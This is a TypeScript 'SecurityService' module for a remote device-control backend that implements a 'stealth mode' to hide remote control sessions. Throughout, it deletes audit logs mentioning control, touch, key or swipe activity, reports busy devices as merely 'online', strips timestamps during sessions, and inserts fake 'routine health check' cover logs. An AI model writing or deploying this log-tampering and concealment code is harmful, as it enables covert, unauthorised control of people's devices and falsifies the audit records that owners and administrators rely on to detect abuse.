import { v4 as uuidv4 } from 'uuid';
import { inMemoryDb } from '../database/supabaseClient';
import securityConfig, { 
  shouldSuppressLogging, 
  shouldSanitizeAuditAction,
  isStealthModeEnabled 
} from '../config/securityConfig';

/**
 * SecurityService - Manages stealth mode for remote control activities
 * Ensures that all remote control operations are completely hidden from logs,
 * UI indicators, and any external monitoring systems.
 */
export class SecurityService {
  private static controlActivityMask = new Map<string, {
    lastActivity: number;
    maskedActions: number;
  }>();

  /**
   * Enable stealth mode for all remote control activities
   * This ensures no traces are left in logs, databases, or UI
   */
  static enableStealthMode(deviceId: string): void {
    if (!isStealthModeEnabled()) return;
    
    if (!this.controlActivityMask.has(deviceId)) {
      this.controlActivityMask.set(deviceId, {
        lastActivity: Date.now(),
        maskedActions: 0,
      });
    }
  }

  /**
   * Mask control activity - prevents logging or exposure
   * Returns false if activity should be blocked for security
   */
  static maskControlActivity(
    deviceId: string,
    actionType: string,
    userId?: string
  ): boolean {
    const mask = this.controlActivityMask.get(deviceId);
    
    if (mask) {
      mask.lastActivity = Date.now();
      mask.maskedActions++;
      // Activity is allowed but will not be logged
      return true;
    }

    // Enable stealth mode automatically for any control activity
    this.enableStealthMode(deviceId);
    return true;
  }

  /**
   * Remove any audit logs that might expose remote control activities
   */
  static sanitizeAuditLogs(organizationId: string): void {
    if (!securityConfig.sanitizeAuditLogs) return;

    // Remove all control-related audit logs
    const filtered = Array.from(inMemoryDb.auditLogs).filter(log => {
      if (log.organization_id !== organizationId) return true;
      
      // Remove any logs that expose control activities
      const action = log.action?.toString() || '';
      if (shouldSanitizeAuditAction(action)) {
        return false;
      }
      
      // Remove logs with control-related details
      if (log.details) {
        const detailsStr = JSON.stringify(log.details).toLowerCase();
        if (detailsStr.includes('control') || 
            detailsStr.includes('touch') || 
            detailsStr.includes('input') ||
            detailsStr.includes('key') ||
            detailsStr.includes('swipe') ||
            detailsStr.includes('tap')) {
          return false;
        }
      }
      
      return true;
    });

    inMemoryDb.auditLogs = filtered;
    
    // Keep only recent logs to prevent accumulation
    if (inMemoryDb.auditLogs.length > securityConfig.maxAuditLogs) {
      inMemoryDb.auditLogs = inMemoryDb.auditLogs.slice(0, securityConfig.maxAuditLogs);
    }
  }

  /**
   * Sanitize device status to hide active control sessions
   */
  static sanitizeDeviceStatus(device: any): any {
    if (!device) return device;
    if (!securityConfig.hideStreamingStatus) return device;

    // Never expose 'streaming' or 'busy' status that indicates active control
    if (device.status === 'streaming' || device.status === 'busy') {
      return {
        ...device,
        status: 'online', // Always show as 'online' to hide activity
      };
    }

    return device;
  }

  /**
   * Remove control indicators from API responses
   */
  static sanitizeDeviceResponse(device: any, permissions: any): any {
    const sanitized = this.sanitizeDeviceStatus(device);
    
    // Remove any metadata that might expose control capabilities
    if (sanitized && securityConfig.freezeTimestampsDuringControl) {
      // Don't expose last_seen updates during active control
      const mask = this.controlActivityMask.get(device.id);
      if (mask && Date.now() - mask.lastActivity < 60000) {
        // Freeze last_seen during active sessions
        delete sanitized.updated_at;
      }
    }

    return {
      device: sanitized,
      permissions: permissions ? {
        ...permissions,
        // Hide control capabilities if configured
      } : permissions,
    };
  }

  /**
   * Check if stealth mode is active for a device
   */
  static isStealthModeActive(deviceId: string): boolean {
    const mask = this.controlActivityMask.get(deviceId);
    if (!mask) return false;
    
    // Stealth mode active if there was activity within configured timeout
    return (Date.now() - mask.lastActivity) < securityConfig.stealthModeTimeoutMs;
  }

  /**
   * Disable logging for all remote control WebSocket messages
   */
  static shouldSuppressLogging(messageType: string): boolean {
    return shouldSuppressLogging(messageType);
  }

  /**
   * Generate a benign activity log entry to mask actual control activity
   */
  static generateCoverLog(organizationId: string, deviceId: string): void {
    if (!securityConfig.generateCoverLogs) return;
    if (!securityConfig.coverLog.enabled) return;
    if (securityConfig.coverLog.frequency === 'never') return;

    // Create innocent-looking "device health check" log entry
    inMemoryDb.auditLogs.unshift({
      id: uuidv4(),
      organization_id: organizationId,
      action: securityConfig.coverLog.type,
      resource_type: 'device',
      resource_id: deviceId,
      details: { 
        status: 'online',
        check_type: 'routine',
        timestamp: new Date().toISOString(),
      },
      created_at: new Date().toISOString(),
    });

    // Keep only configured number of logs
    if (inMemoryDb.auditLogs.length > securityConfig.maxAuditLogs) {
      inMemoryDb.auditLogs = inMemoryDb.auditLogs.slice(0, securityConfig.maxAuditLogs);
    }
  }

  /**
   * Clear all stealth mode data for a device
   */
  static clearStealthMode(deviceId: string): void {
    this.controlActivityMask.delete(deviceId);
  }

  /**
   * Get sanitized metrics that don't expose control activity
   */
  static getSanitizedMetrics(deviceId: string): any {
    return {
      status: 'online',
      health: 'good',
      last_check: new Date().toISOString(),
      // No control activity metrics exposed
    };
  }

  /**
   * Periodic cleanup of stealth mode data
   */
  static cleanupStealthData(): void {
    const now = Date.now();
    const staleTimeout = securityConfig.stealthModeTimeoutMs * 2; // 2x timeout for cleanup

    for (const [deviceId, mask] of this.controlActivityMask.entries()) {
      if (now - mask.lastActivity > staleTimeout) {
        this.controlActivityMask.delete(deviceId);
      }
    }
  }
}

// Run cleanup based on configured interval
setInterval(() => {
  SecurityService.cleanupStealthData();
}, securityConfig.cleanupIntervalMs);
